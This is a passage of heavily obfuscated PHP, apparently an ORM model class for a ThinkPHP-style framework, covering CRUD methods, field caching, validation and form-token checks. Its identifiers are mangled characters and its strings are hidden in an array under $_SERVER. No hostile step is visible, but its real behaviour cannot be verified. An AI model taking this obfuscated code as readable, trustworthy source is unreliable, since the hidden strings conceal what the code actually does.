} if (is_null($†ÃÎƒê)) { $this->tablePrefix = $–ÎâÕ”[12]; } elseif ($–ÎâÕ”[12] != $†ÃÎƒê) { $this->tablePrefix = $†ÃÎƒê; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($–ÎâÕ”[324]); } $this->db(0, empty($this->connection) ? $Ù€Ëºë : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Òı¼â·¥ =& $_SERVER[ÅÄÇĞô]; if (empty($this->fields)) { if (think_config($Òı¼â·¥[325])) { $ø¢‰Æ— = $this->dbName ? $this->dbName : think_config($Òı¼â·¥[326]); $¯ÃØü• = think_var_cache($Òı¼â·¥[327] . strtolower(get_path_this($ø¢‰Æ—) . $Òı¼â·¥[10] . $this->name)); if ($¯ÃØü•) { $¢î«ÊŸ‡ = think_config($Òı¼â·¥[328]); if (empty($¢î«ÊŸ‡) || $¯ÃØü•[$Òı¼â·¥[329]] == $¢î«ÊŸ‡) { $this->fields = $¯ÃØü•; return; } } } $this->flush(); } } public function flush() { $ğæä“† =& $_SERVER[ÅÄÇĞô]; $this->db->setModel($this->name); $•½´¬ş = $this->db->getFields($this->getTableName()); if (!$•½´¬ş) { return !1; } $this->fields = array_keys($•½´¬ş); $this->fields[$ğæä“†[330]] = !1; foreach ($•½´¬ş as $æÛ“¾»µ => $ùˆ¢ĞãŞ) { $²öİ©[$æÛ“¾»µ] = $ùˆ¢ĞãŞ[$ğæä“†[33]]; if ($ùˆ¢ĞãŞ[$ğæä“†[39]]) { $this->fields[$ğæä“†[331]] = $æÛ“¾»µ; if ($ùˆ¢ĞãŞ[$ğæä“†[42]]) { $this->fields[$ğæä“†[330]] = !0; } } } $this->fields[$ğæä“†[332]] = $²öİ©; if (think_config($ğæä“†[328])) { $this->fields[$ğæä“†[329]] = think_config($ğæä“†[328]); } if (think_config($ğæä“†[325])) { $‚³ÔÕ‘Ò = $this->dbName ? $this->dbName : think_config($ğæä“†[326]); think_var_cache($ğæä“†[327] . strtolower(get_path_this($‚³ÔÕ‘Ò) . $ğæä“†[10] . $this->name), $this->fields); } } public function switchModel($Õøâùƒ», $ªÕÂ€®Á = array()) { $ĞúÖê¶ =& $_SERVER[ÅÄÇĞô]; $‘†£•õ = ucwords(strtolower($Õøâùƒ»)) . $ĞúÖê¶[333]; if (!class_exists($‘†£•õ)) { think_exception($‘†£•õ . think_lang($ĞúÖê¶[334])); } $this->_extModel = new $‘†£•õ($this->name); if (!empty($ªÕÂ€®Á)) { foreach ($ªÕÂ€®Á as $Î÷Ä½üË) { $this->_extModel->setProperty($Î÷Ä½üË, $this->{$Î÷Ä½üË}); } } return $this->_extModel; } public function __set($ğìñûÄ×, $ó²“ŠË‘) { $this->data[$ğìñûÄ×] = $ó²“ŠË‘; } public function __get($µô‡ëÕ) { return isset($this->data[$µô‡ëÕ]) ? $this->data[$µô‡ëÕ] : null; } public function __isset($äöÃ˜íé) { return isset($this->data[$äöÃ˜íé]); } public function __unset($åàÃ¨ç) { unset($this->data[$åàÃ¨ç]); } public function __call($¼ø™ íõ, $›ê÷ƒÌ¿) { $ªÃ–»¾Í =& $_SERVER[ÅÄÇĞô]; if (in_array(strtolower($¼ø™ íõ), $this->methods, !0)) { $this->options[strtolower($¼ø™ íõ)] = $›ê÷ƒÌ¿[0]; return $this; } elseif (in_array(strtolower($¼ø™ íõ), array($ªÃ–»¾Í[335], $ªÃ–»¾Í[336], $ªÃ–»¾Í[337], $ªÃ–»¾Í[338], $ªÃ–»¾Í[339]), !0)) { $‘ÉÔû†ê = isset($›ê÷ƒÌ¿[0]) ? $›ê÷ƒÌ¿[0] : $ªÃ–»¾Í[223]; $‘ÉÔû†ê = $this->db->parseKey($‘ÉÔû†ê); return $this->getField(strtoupper($¼ø™ íõ) . $ªÃ–»¾Í[340] . $‘ÉÔû†ê . $ªÃ–»¾Í[341] . $¼ø™ íõ, $ªÃ–»¾Í[335]); } elseif (strtolower(substr($¼ø™ íõ, 0, 5)) == $ªÃ–»¾Í[342]) { $‘ÉÔû†ê = think_parse_name(substr($¼ø™ íõ, 5)); $”Š¾’´ù[$‘ÉÔû†ê] = $›ê÷ƒÌ¿[0]; return $this->where($”Š¾’´ù)->find(); } elseif (strtolower(substr($¼ø™ íõ, 0, 10)) == $ªÃ–»¾Í[343]) { $ø×‡¹´± = think_parse_name(substr($¼ø™ íõ, 10)); $”Š¾’´ù[$ø×‡¹´±] = $›ê÷ƒÌ¿[0]; return $this->where($”Š¾’´ù)->getField($›ê÷ƒÌ¿[1]); } elseif (isset($this->_scope[$¼ø™ íõ])) { return $this->scope($¼ø™ íõ, $›ê÷ƒÌ¿[0]); } elseif (method_exists($this, $¼ø™ íõ)) { array_unshift($›ê÷ƒÌ¿, $¼ø™ íõ); return call_user_func_array(array($this, $ªÃ–»¾Í[344]), $›ê÷ƒÌ¿); } else { return call_user_func_array(array(parent, $¼ø™ íõ), $›ê÷ƒÌ¿); } } protected function call() { $ÁäâĞ¿½ =& $_SERVER[ÅÄÇĞô]; $¬”¬©¸ = func_get_args(); $äÒ»§ = array_shift($¬”¬©¸); $ÜÇ«ó = $äÒ»§; if (is_array($äÒ»§)) { $ÜÇ«ó = $äÒ»§[1]; $äÒ»§ = $äÒ»§[0]; } $È—±Ù = count($¬”¬©¸) - 1; if (isset($¬”¬©¸[$È—±Ù]) && $¬”¬©¸[$È—±Ù] === $äÒ»§) { think_exception(__CLASS__ . $ÁäâĞ¿½[4] . $äÒ»§ . think_lang($ÁäâĞ¿½[345])); return; } $¬”¬©¸[] = $äÒ»§; if (method_exists($this, $ÁäâĞ¿½[346])) { $…©–”Şñ = call_user_func_array(array($this, $ÁäâĞ¿½[347]), array($ÜÇ«ó, $¬”¬©¸)); if (!is_null($…©–”Şñ) && $…©–”Şñ !== !1) { return $…©–”Şñ; } } $ìËâäŠ® = call_user_func_array(array($this, $äÒ»§), $¬”¬©¸); if (method_exists($this, $ÁäâĞ¿½[348])) { $…©–”Şñ = call_user_func_array(array($this, $ÁäâĞ¿½[349]), array($ÜÇ«ó, $¬”¬©¸, $ìËâäŠ®)); if ($…©–”Şñ) { return $…©–”Şñ; } } return $ìËâäŠ®; } protected function _initialize() { } protected function _facade($Çú·‹ö) { $÷†‘ÇÚ“ =& $_SERVER[ÅÄÇĞô]; if (!empty($this->fields)) { foreach ($Çú·‹ö as $°ù£ÛÏ => $Ñ»¢µÅÅ) { if (is_array($this->fields) && !in_array($°ù£ÛÏ, $this->fields, !0)) { unset($Çú·‹ö[$°ù£ÛÏ]); } elseif (is_scalar($Ñ»¢µÅÅ)) { $this->_parseType($Çú·‹ö, $°ù£ÛÏ); } } } if (!empty($this->options[$÷†‘ÇÚ“[350]])) { $Çú·‹ö = array_map($this->options[$÷†‘ÇÚ“[350]], $Çú·‹ö); unset($this->options[$÷†‘ÇÚ“[350]]); } $this->_beforeWrite($Çú·‹ö); return $Çú·‹ö; } protected function _beforeWrite(&$¦üğ³ÒÓ) { } public function add($øëÉş¡Ë = '', $½¤Æ½äú = array(), $ù•‡”ä  = false) { if (empty($øëÉş¡Ë)) { if (!empty($this->data)) { $øëÉş¡Ë = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ÅÄÇĞô][351]); return !1; } } $½¤Æ½äú = $this->_parseOptions($½¤Æ½äú); $øëÉş¡Ë = $this->_facade($øëÉş¡Ë); if (!1 === $this->_beforeInsert($øëÉş¡Ë, $½¤Æ½äú)) { return !1; } $î®Ã•“Ÿ = $this->db->insert($øëÉş¡Ë, $½¤Æ½äú, $ù•‡”ä ); if (!1 !== $î®Ã•“Ÿ) { $ËÔ²êÌì = $this->getLastInsID(); if ($ËÔ²êÌì) { $øëÉş¡Ë[$this->getPk()] = $ËÔ²êÌì; $this->_after_insert($øëÉş¡Ë, $½¤Æ½äú); return $ËÔ²êÌì; } $this->_after_insert($øëÉş¡Ë, $½¤Æ½äú); } return $î®Ã•“Ÿ; } protected function _beforeInsert(&$¥Î‘İŞ, $æ€ÀÊ¥¬) { } protected function _after_insert($’ŒÔòµå, $ŒÉ±Š¾â) { } public function addAll($Äš»ıàÑ, $°¼¥’ƒ = array(), $½³é¤•à = false) { $õÒ›İ•ä =& $_SERVER[ÅÄÇĞô]; if (empty($Äš»ıàÑ)) { $this->error = think_lang($õÒ›İ•ä[351]); return !1; } $°¼¥’ƒ = $this->_parseOptions($°¼¥’ƒ); foreach ($Äš»ıàÑ as $…•çˆúœ => $ŠİŞ¨ÆÊ) { $Äš»ıàÑ[$…•çˆúœ] = $this->_facade($ŠİŞ¨ÆÊ); } if (method_exists($this->db, $õÒ›İ•ä[352])) { $ÒéÅáÔŞ = $this->db->insertAll($Äš»ıàÑ, $°¼¥’ƒ, $½³é¤•à); } else { $this->startTrans(); foreach ($Äš»ıàÑ as $…•çˆúœ => $ŠİŞ¨ÆÊ) { $ÒéÅáÔŞ = $this->db->insert($ŠİŞ¨ÆÊ, $°¼¥’ƒ, $½³é¤•à); } $this->commit(); } if (!1 !== $ÒéÅáÔŞ) { $ôí¿úÚ„ = $this->getLastInsID(); if ($ôí¿úÚ„) { return $ôí¿úÚ„; } } return $ÒéÅáÔŞ; } public function selectAdd($ß¾Âáë¾ = '', $æ¹æïÁ¬ = '', $à®ìµ¶ı = array()) { $”æ¡ïº =& $_SERVER[ÅÄÇĞô]; $à®ìµ¶ı = $this->_parseOptions($à®ìµ¶ı); if (!1 === ($æ×©§õå = $this->db->selectInsert($ß¾Âáë¾ ? $ß¾Âáë¾ : $à®ìµ¶ı[$”æ¡ïº[353]], $æ¹æïÁ¬ ? $æ¹æïÁ¬ : $this->getTableName(), $à®ìµ¶ı))) { $this->error = think_lang($”æ¡ïº[354]); return !1; } else { return $æ×©§õå; } } public function save($¾ùùŠ…¨ = '', $“–Ù¨Åœ = array()) { $²ú³°Ÿ˜ =& $_SERVER[ÅÄÇĞô]; if (empty($¾ùùŠ…¨)) { if (!empty($this->data)) { $¾ùùŠ…¨ = $this->data; $this->data = array(); } else { $this->error = think_lang($²ú³°Ÿ˜[351]); return !1; } } $¾ùùŠ…¨ = $this->_facade($¾ùùŠ…¨); $“–Ù¨Åœ = $this->_parseOptions($“–Ù¨Åœ); $ÜññâÀ“ = $this->getPk(); if (!isset($“–Ù¨Åœ[$²ú³°Ÿ˜[355]])) { if (isset($¾ùùŠ…¨[$ÜññâÀ“])) { $ØŒê’½[$ÜññâÀ“] = $¾ùùŠ…¨[$ÜññâÀ“]; $“–Ù¨Åœ[$²ú³°Ÿ˜[355]] = $ØŒê’½; unset($¾ùùŠ…¨[$ÜññâÀ“]); } else { $this->error = think_lang($²ú³°Ÿ˜[354]); return !1; } } if (is_array($“–Ù¨Åœ[$²ú³°Ÿ˜[355]]) && isset($“–Ù¨Åœ[$²ú³°Ÿ˜[355]][$ÜññâÀ“])) { $»ëÍÎé• = $“–Ù¨Åœ[$²ú³°Ÿ˜[355]][$ÜññâÀ“]; } if (!1 === $this->_beforeUpdate($¾ùùŠ…¨, $“–Ù¨Åœ)) { return !1; } $Á­š¾–– = $this->db->update($¾ùùŠ…¨, $“–Ù¨Åœ); if (!1 !== $Á­š¾––) { if (isset($»ëÍÎé•)) { $¾ùùŠ…¨[$ÜññâÀ“] = $»ëÍÎé•; } $this->_afterUpdate($¾ùùŠ…¨, $“–Ù¨Åœ); } return $Á­š¾––; } protected function _beforeUpdate(&$ï¹¥¸ƒĞ, $Ìç¿¥ñ¬) { } protected function _afterUpdate($¤Ù²Ø ı, $â¢Ê©Ü) { } public function delete($à­ˆ±äÍ = array()) { $ôºåÒŸ¸ =& $_SERVER[ÅÄÇĞô]; if (empty($à­ˆ±äÍ) && empty($this->options[$ôºåÒŸ¸[355]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $öÁüüâ¨ = $this->getPk(); if (is_numeric($à­ˆ±äÍ) || is_string($à­ˆ±äÍ)) { if (strpos($à­ˆ±äÍ, $ôºåÒŸ¸[50])) { $·¼ÆŸ€ú[$öÁüüâ¨] = array($ôºåÒŸ¸[356], $à­ˆ±äÍ); } else { $·¼ÆŸ€ú[$öÁüüâ¨] = $à­ˆ±äÍ; } $this->options[$ôºåÒŸ¸[355]] = $·¼ÆŸ€ú; } $à­ˆ±äÍ = $this->_parseOptions(); if (is_array($à­ˆ±äÍ[$ôºåÒŸ¸[355]]) && isset($à­ˆ±äÍ[$ôºåÒŸ¸[355]][$öÁüüâ¨])) { $ã¸”‡” = $à­ˆ±äÍ[$ôºåÒŸ¸[355]][$öÁüüâ¨]; } $¼¸Ôş½£ = $this->db->delete($à­ˆ±äÍ); if (!1 !== $¼¸Ôş½£) { $â­ƒü–³ = array(); if (isset($ã¸”‡”)) { $â­ƒü–³[$öÁüüâ¨] = $ã¸”‡”; } $this->_after_delete($â­ƒü–³, $à­ˆ±äÍ); } return $¼¸Ôş½£; } protected function _after_delete($Û•°áØ¡, $•ŸĞŞæ) { } public function select($‡Ì¬®ò = array()) { $»»õô¶¯ =& $_SERVER[ÅÄÇĞô]; if (is_string($‡Ì¬®ò) || is_numeric($‡Ì¬®ò)) { $öğÓ¥êÜ = $this->getPk(); if (strpos($‡Ì¬®ò, $»»õô¶¯[50])) { $›’ªƒ‡Ğ[$öğÓ¥êÜ] = array($»»õô¶¯[356], $‡Ì¬®ò); } else { $›’ªƒ‡Ğ[$öğÓ¥êÜ] = $‡Ì¬®ò; } $this->options[$»»õô¶¯[355]] = $›’ªƒ‡Ğ; } elseif (!1 === $‡Ì¬®ò) { $‡Ì¬®ò = $this->_parseOptions(); return $»»õô¶¯[357] . $this->db->buildSelectSql($‡Ì¬®ò) . $»»õô¶¯[358]; } $‡Ì¬®ò = $this->_parseOptions(); $©õ½Èî = $this->db->select($‡Ì¬®ò); if (!1 === $©õ½Èî) { return !1; } if (empty($©õ½Èî)) { return null; } $this->_afterSelect($©õ½Èî, $‡Ì¬®ò); return $©õ½Èî; } protected function _afterSelect(&$Â®ŸêÜ, $éÛÔû°Ç) { } public function buildSql($›¼©³ÒŒ = array()) { $Œùñì¿¬ =& $_SERVER[ÅÄÇĞô]; $›¼©³ÒŒ = $this->_parseOptions($›¼©³ÒŒ); return $Œùñì¿¬[357] . $this->db->buildSelectSql($›¼©³ÒŒ) . $Œùñì¿¬[358]; } public function optionsValue($¬È‘›¯ü = null) { if (is_null($¬È‘›¯ü)) { return $this->options; } elseif (is_array($¬È‘›¯ü)) { $this->options = array_merge($this->options, $¬È‘›¯ü); } } protected function _parseOptions($š×šãè = array()) { $‡†û«í“ =& $_SERVER[ÅÄÇĞô]; if (is_array($š×šãè)) { $š×šãè = array_merge($this->options, $š×šãè); } $this->options = array(); if (!isset($š×šãè[$‡†û«í“[359]])) { $š×šãè[$‡†û«í“[359]] = $this->getTableName(); $¿Àµ¿å¸ = $this->fields; } else { $¿Àµ¿å¸ = $this->getDbFields(); } if (!empty($š×šãè[$‡†û«í“[360]])) { $š×šãè[$‡†û«í“[359]] .= $‡†û«í“[53] . $š×šãè[$‡†û«í“[360]]; } $š×šãè[$‡†û«í“[361]] = $this->name; if (isset($š×šãè[$‡†û«í“[355]]) && is_array($š×šãè[$‡†û«í“[355]]) && !empty($¿Àµ¿å¸) && !isset($š×šãè[$‡†û«í“[362]]) && !isset($š×šãè[$‡†û«í“[359]])) { foreach ($š×šãè[$‡†û«í“[355]] as $ªÓÅĞÕ‹ => $ÜêËï•®) { $ªÓÅĞÕ‹ = trim($ªÓÅĞÕ‹); if (in_array($ªÓÅĞÕ‹, $¿Àµ¿å¸, !0)) { if (is_scalar($ÜêËï•®)) { $this->_parseType($š×šãè[$‡†û«í“[355]], $ªÓÅĞÕ‹); } } elseif (!is_numeric($ªÓÅĞÕ‹) && $‡†û«í“[11] != substr($ªÓÅĞÕ‹, 0, 1) && !1 === strpos($ªÓÅĞÕ‹, $‡†û«í“[10]) && !1 === strpos($ªÓÅĞÕ‹, $‡†û«í“[340]) && !1 === strpos($ªÓÅĞÕ‹, $‡†û«í“[215]) && !1 === strpos($ªÓÅĞÕ‹, $‡†û«í“[287])) { unset($š×šãè[$‡†û«í“[355]][$ªÓÅĞÕ‹]); } } } $this->_options_filter($š×šãè); return $š×šãè; } protected function _options_filter(&$Ö¿ÎÇ—í) { } protected function _parseType(&$ï“¡ğ¾•, $ğËôÒÒ) { $ëğ—š¹ =& $_SERVER[ÅÄÇĞô]; if (empty($this->options[$ëğ—š¹[363]][$ëğ—š¹[4] . $ğËôÒÒ])) { $Ã¾ïßğô = strtolower($this->fields[$ëğ—š¹[332]][$ğËôÒÒ]); if (!1 !== strpos($Ã¾ïßğô, $ëğ—š¹[364])) { } elseif (!1 === strpos($Ã¾ïßğô, $ëğ—š¹[365]) && !1 !== strpos($Ã¾ïßğô, $ëğ—š¹[366])) { $ï“¡ğ¾•[$ğËôÒÒ] = intval($ï“¡ğ¾•[$ğËôÒÒ]); } elseif (!1 !== strpos($Ã¾ïßğô, $ëğ—š¹[367]) || !1 !== strpos($Ã¾ïßğô, $ëğ—š¹[368])) { $ï“¡ğ¾•[$ğËôÒÒ] = floatval($ï“¡ğ¾•[$ğËôÒÒ]); } elseif (!1 !== strpos($Ã¾ïßğô, $ëğ—š¹[369])) { $ï“¡ğ¾•[$ğËôÒÒ] = (bool) $ï“¡ğ¾•[$ğËôÒÒ]; } } } public function find($¬ìÁˆÒí = array()) { $Úâç÷ñ² =& $_SERVER[ÅÄÇĞô]; if (is_numeric($¬ìÁˆÒí) || is_string($¬ìÁˆÒí)) { $œÇ‘äˆ[$this->getPk()] = intval($¬ìÁˆÒí); $this->options[$Úâç÷ñ²[355]] = $œÇ‘äˆ; } $this->options[$Úâç÷ñ²[370]] = 1; $¬ìÁˆÒí = $this->_parseOptions(); $üŒÒ£ùù = $this->db->select($¬ìÁˆÒí); if (!1 === $üŒÒ£ùù) { return !1; } if (empty($üŒÒ£ùù)) { return null; } $this->data = $üŒÒ£ùù[0]; $this->_afterFind($this->data, $¬ìÁˆÒí); if (!empty($this->options[$Úâç÷ñ²[371]])) { return $this->returnResult($this->data, $this->options[$Úâç÷ñ²[371]]); } return $this->data; } protected function _afterFind(&$ößÒß‰æ, $”ŞÂ£Éœ) { } protected function returnResult($×…–­ìÅ, $™ìÌÓ = '') { $ìèì¢à =& $_SERVER[ÅÄÇĞô]; if ($™ìÌÓ) { if (is_callable($™ìÌÓ)) { return call_user_func($™ìÌÓ, $×…–­ìÅ); } switch (strtolower($™ìÌÓ)) { case $ìèì¢à[372]: return json_encode($×…–­ìÅ); case $ìèì¢à[373]: return xml_encode($×…–­ìÅ); } } return $×…–­ìÅ; } public function parseFieldsMap($ğáË£³à, $Ñ˜Œ·ıÁ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ÙÔÜ¼»¸ => $‡¢‚ñ®œ) { if ($Ñ˜Œ·ıÁ == 1) { if (isset($ğáË£³à[$‡¢‚ñ®œ])) { $ğáË£³à[$ÙÔÜ¼»¸] = $ğáË£³à[$‡¢‚ñ®œ]; unset($ğáË£³à[$‡¢‚ñ®œ]); } } else { if (isset($ğáË£³à[$ÙÔÜ¼»¸])) { $ğáË£³à[$‡¢‚ñ®œ] = $ğáË£³à[$ÙÔÜ¼»¸]; unset($ğáË£³à[$ÙÔÜ¼»¸]); } } } } return $ğáË£³à; } public function setField($ë—æò“¦, $ØÌ—½İÅ = '') { if (is_array($ë—æò“¦)) { $¡ßô¼¤£ = $ë—æò“¦; } else { $¡ßô¼¤£[$ë—æò“¦] = $ØÌ—½İÅ; } return $this->save($¡ßô¼¤£); } public function setAdd($Ö¼Ù¨‰Ô, $¤ßÑØì = 1) { $ßÁƒ¤Ë =& $_SERVER[ÅÄÇĞô]; $ª—ïÚŠ = $Ö¼Ù¨‰Ô . $ßÁƒ¤Ë[374] . $¤ßÑØì; if ($¤ßÑØì < 0) { $ª—ïÚŠ = $Ö¼Ù¨‰Ô . $¤ßÑØì; } return $this->setField($Ö¼Ù¨‰Ô, array($ßÁƒ¤Ë[375], $ª—ïÚŠ)); } public function getField($òÃŸúà‹, $âæÙ = null) { $åõÛ²Ô =& $_SERVER[ÅÄÇĞô]; $ï›–ƒÔ€[$åõÛ²Ô[353]] = $òÃŸúà‹; $ï›–ƒÔ€ = $this->_parseOptions($ï›–ƒÔ€); $òÃŸúà‹ = trim($òÃŸúà‹); if (strpos($òÃŸúà‹, $åõÛ²Ô[50])) { if (!isset($ï›–ƒÔ€[$åõÛ²Ô[370]])) { $ï›–ƒÔ€[$åõÛ²Ô[370]] = is_numeric($âæÙ) ? $âæÙ : $åõÛ²Ô[12]; } $Òâ§œœó = $this->db->select($ï›–ƒÔ€); if (!empty($Òâ§œœó)) { $çäØáÂÕ = explode($åõÛ²Ô[50], $òÃŸúà‹); $òÃŸúà‹ = array_keys($Òâ§œœó[0]); $‘¤êóÃ® = array_shift($òÃŸúà‹); $Â½ş˜÷» = array_shift($òÃŸúà‹); $ÅÜÄÆé™ = array(); $ö†éçÉ = count($çäØáÂÕ); foreach ($Òâ§œœó as $¯˜’˜™Ê) { $À›ÑéÊ« = $¯˜’˜™Ê[$‘¤êóÃ®]; if (2 == $ö†éçÉ) { $ÅÜÄÆé™[$À›ÑéÊ«] = $¯˜’˜™Ê[$Â½ş˜÷»]; } else { $ÅÜÄÆé™[$À›ÑéÊ«] = is_string($âæÙ) ? implode($âæÙ, $¯˜’˜™Ê) : $¯˜’˜™Ê; } } return $ÅÜÄÆé™; } } else { if (!0 !== $âæÙ) { $ï›–ƒÔ€[$åõÛ²Ô[370]] = is_numeric($âæÙ) ? $âæÙ : 1; } if ($âæÙ === $åõÛ²Ô[335]) { unset($ï›–ƒÔ€[$åõÛ²Ô[370]]); } $¯˜’˜™Ê = $this->db->select($ï›–ƒÔ€); if (!empty($¯˜’˜™Ê)) { if ($âæÙ === $åõÛ²Ô[335]) { return reset($¯˜’˜™Ê[0]); } if (!0 !== $âæÙ && 1 == $ï›–ƒÔ€[$åõÛ²Ô[370]]) { return reset($¯˜’˜™Ê[0]); } foreach ($¯˜’˜™Ê as $¬”¶Öƒß) { $– Äáì[] = $¬”¶Öƒß[$òÃŸúà‹]; } return $– Äáì; } } return null; } public function create($Š¡ ‘Ğ¥ = '', $ãÉÀÊÙç = '') { $ì¿˜Ìºò =& $_SERVER[ÅÄÇĞô]; if (empty($Š¡ ‘Ğ¥)) { $Š¡ ‘Ğ¥ = $_POST; } elseif (is_object($Š¡ ‘Ğ¥)) { $Š¡ ‘Ğ¥ = get_object_vars($Š¡ ‘Ğ¥); } if (empty($Š¡ ‘Ğ¥) || !is_array($Š¡ ‘Ğ¥)) { $this->error = think_lang($ì¿˜Ìºò[351]); return !1; } $Š¡ ‘Ğ¥ = $this->parseFieldsMap($Š¡ ‘Ğ¥, 0); $ãÉÀÊÙç = $ãÉÀÊÙç ? $ãÉÀÊÙç : (!empty($Š¡ ‘Ğ¥[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ì¿˜Ìºò[353]])) { $Íêùˆé¿ = $this->options[$ì¿˜Ìºò[353]]; unset($this->options[$ì¿˜Ìºò[353]]); } elseif ($ãÉÀÊÙç == THINK_MODEL_INSERT && isset($this->insertFields)) { $Íêùˆé¿ = $this->insertFields; } elseif ($ãÉÀÊÙç == THINK_MODEL_UPDATE && isset($this->updateFields)) { $Íêùˆé¿ = $this->updateFields; } if (isset($Íêùˆé¿)) { if (is_string($Íêùˆé¿)) { $Íêùˆé¿ = explode($ì¿˜Ìºò[50], $Íêùˆé¿); } if (think_config($ì¿˜Ìºò[376])) { $Íêùˆé¿[] = think_config($ì¿˜Ìºò[377]); } foreach ($Š¡ ‘Ğ¥ as $Î¿ãÅšÌ => $°²¯Ø†’) { if (!in_array($Î¿ãÅšÌ, $Íêùˆé¿)) { unset($Š¡ ‘Ğ¥[$Î¿ãÅšÌ]); } } } if (!$this->autoValidation($Š¡ ‘Ğ¥, $ãÉÀÊÙç)) { return !1; } if (!$this->autoCheckToken($Š¡ ‘Ğ¥)) { $this->error = think_lang($ì¿˜Ìºò[378]); return !1; } if ($this->autoCheckFields) { $Íêùˆé¿ = $this->getDbFields(); foreach ($Š¡ ‘Ğ¥ as $Î¿ãÅšÌ => $°²¯Ø†’) { if (!in_array($Î¿ãÅšÌ, $Íêùˆé¿)) { unset($Š¡ ‘Ğ¥[$Î¿ãÅšÌ]); } elseif (MAGIC_QUOTES_GPC && is_string($°²¯Ø†’)) { $Š¡ ‘Ğ¥[$Î¿ãÅšÌ] = stripslashes($°²¯Ø†’); } } } $this->autoOperation($Š¡ ‘Ğ¥, $ãÉÀÊÙç); $this->data = $Š¡ ‘Ğ¥; return $Š¡ ‘Ğ¥; } public function autoCheckToken($Îô›ÌÚË) { $ëÊ¾ô =& $_SERVER[ÅÄÇĞô]; if (isset($this->options[$ëÊ¾ô[379]]) && !$this->options[$ëÊ¾ô[379]]) { return !0; } if (think_config($ëÊ¾ô[376])) { $®Â™ïÔÖ = think_config($ëÊ¾ô[377]); if (!isset($Îô›ÌÚË[$®Â™ïÔÖ]) || Session::get($®Â™ïÔÖ)) { return !1; } list($äÀëˆæ, $ª¿ÆÁä») = explode($ëÊ¾ô[11], $Îô›ÌÚË[$®Â™ïÔÖ]); if ($ª¿ÆÁä» && Session::get($®Â™ïÔÖ . $ëÊ¾ô[10] . $äÀëˆæ) === $ª¿ÆÁä») { Session::remove($®Â™ïÔÖ . $ëÊ¾ô[10] . $äÀëˆæ); return !0; } if (think_config($ëÊ¾ô[380])) { Session::remove($®Â™ïÔÖ . $ëÊ¾ô[10] . $äÀëˆæ); } return !1; } return !0; } public function regex($²œ„œ‚, $ØŞéÈ’¡) { $ñÙ¸ë¬ı =& $_SERVER[ÅÄÇĞô]; $ôŞËß‚­ = array($ñÙ¸ë¬ı[381] => $ñÙ¸ë¬ı[382], $ñÙ¸ë¬ı[383] => $ñÙ¸ë¬ı[384], $ñÙ¸ë¬ı[385] => $ñÙ¸ë¬ı[386], $ñÙ¸ë¬ı[387] => $ñÙ¸ë¬ı[388], $ñÙ¸ë¬ı[389] => $ñÙ¸ë¬ı[390], $ñÙ¸ë¬ı[391] => $ñÙ¸ë¬ı[392], $ñÙ¸ë¬ı[393] => $ñÙ¸ë¬ı[394], $ñÙ¸ë¬ı[368] => $ñÙ¸ë¬ı[395], $ñÙ¸ë¬ı[396] => $ñÙ¸ë¬ı[397]); if (isset($ôŞËß‚­[strtolower($ØŞéÈ’¡)])) { $ØŞéÈ’¡ = $ôŞËß‚­[strtolower($ØŞéÈ’¡)]; } return preg_match($ØŞéÈ’¡, $²œ„œ‚) === 1; } private function autoOperation(&$µÕ£ØßÚ, $±¦Œ¥‰•) { $Ğ¸µ……™ =& $_SERVER[ÅÄÇĞô]; if (!empty($this->options[$Ğ¸µ……™[398]])) { $–ÕÖ¹Ş = $this->options[$Ğ¸µ……™[398]]; unset($this->options[$Ğ¸µ……™[398]]); } elseif (!empty($this->_auto)) { $–ÕÖ¹Ş = $this->_auto; } if (isset($–ÕÖ¹Ş)) { foreach ($–ÕÖ¹Ş as $ƒºşËÅÑ) { if (empty($ƒºşËÅÑ[2])) { $ƒºşËÅÑ[2] = THINK_MODEL_INSERT; } if ($±¦Œ¥‰• == $ƒºşËÅÑ[2] || $ƒºşËÅÑ[2] == THINK_MODEL_BOTH) { switch (trim($ƒºşËÅÑ[3])) { case $Ğ¸µ……™[399]: case $Ğ¸µ……™[400]: $øİ¯Å· = isset($ƒºşËÅÑ[4]) ? (array) $ƒºşËÅÑ[4] : array(); if (isset($µÕ£ØßÚ[$ƒºşËÅÑ[0]])) { array_unshift($øİ¯Å·, $µÕ£ØßÚ[$ƒºşËÅÑ[0]]); } if ($Ğ¸µ……™[399] == $ƒºşËÅÑ[3]) { $µÕ£ØßÚ[$ƒºşËÅÑ[0]] = call_user_func_array($ƒºşËÅÑ[1], $øİ¯Å·); } else { $µÕ£ØßÚ[$ƒºşËÅÑ[0]] = call_user_func_array(array(&$this, $ƒºşËÅÑ[1]), $øİ¯Å·); } break; case $Ğ¸µ……™[353]: $µÕ£ØßÚ[$ƒºşËÅÑ[0]] = $µÕ£ØßÚ[$ƒºşËÅÑ[1]]; break; case $Ğ¸µ……™[401]: if ($Ğ¸µ……™[12] === $µÕ£ØßÚ[$ƒºşËÅÑ[0]]) { unset($µÕ£ØßÚ[$ƒºşËÅÑ[0]]); } break; case $Ğ¸µ……™[402]: default: $µÕ£ØßÚ[$ƒºşËÅÑ[0]] = $ƒºşËÅÑ[1]; } if (!1 === $µÕ£ØßÚ[$ƒºşËÅÑ[0]]) { unset($µÕ£ØßÚ[$ƒºşËÅÑ[0]]); } } } } return $µÕ£ØßÚ; } protected function autoValidation($§¥³‘¥Â, $™œ²†Ã†) { $Ç—Ùİİ´ =& $_SERVER[ÅÄÇĞô]; if (!empty($this->options[$Ç—Ùİİ´[403]])) { $ÃÉÃ°” = $this->options[$Ç—Ùİİ´[403]]; unset($this->options[$Ç—Ùİİ´[403]]); } elseif (!empty($this->_validate)) { $ÃÉÃ°” = $this->_validate; } if (isset($ÃÉÃ°”)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÃÉÃ°” as $õôªŞÙ => $æïµœ¿â) { if (empty($æïµœ¿â[5]) || $æïµœ¿â[5] == THINK_MODEL_BOTH || $æïµœ¿â[5] == $™œ²†Ã†) { if (0 == strpos($æïµœ¿â[2], $Ç—Ùİİ´[404]) && strpos($æïµœ¿â[2], $Ç—Ùİİ´[405])) { $æïµœ¿â[2] = think_lang(substr($æïµœ¿â[2], 2, -1)); } $æïµœ¿â[3] = 